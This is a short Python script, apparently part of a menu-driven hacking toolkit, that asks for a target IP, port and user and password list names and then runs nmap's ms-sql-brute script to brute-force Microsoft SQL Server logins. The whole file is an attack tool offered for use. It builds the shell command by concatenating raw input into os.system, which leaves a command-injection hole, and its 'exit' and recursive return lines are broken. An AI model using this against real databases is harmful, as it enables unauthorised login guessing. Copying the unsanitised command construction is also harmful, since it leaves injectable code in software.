import os

def nmap_mssql_attack():
    print("""
    --------------------------------------------
        
            NMAP MSSQL DB ATTACK
                DO YOU WANT IT
                    1 : YES
                    2 : NO

    --------------------------------------------
    """)



    processNo = input("Do You Want It: ")
    if(processNo == "1"):
        portno = input("Please Enter Port No: ")
        ipno = input("Pleade Enter IP No: ")
        userdb = input("Please Enter User DB Name: ")
        passdb = input("Please Enter DB Password")

        os.system("nmap -p  "+portno+" --script ms-sql-brute --script-args userdb="+userdb+",passdb="+passdb+" "+ipno)
    elif(processNo == "2"):
        exit
    else:
        return nmap_mssql_attack


nmap_mssql_attack()




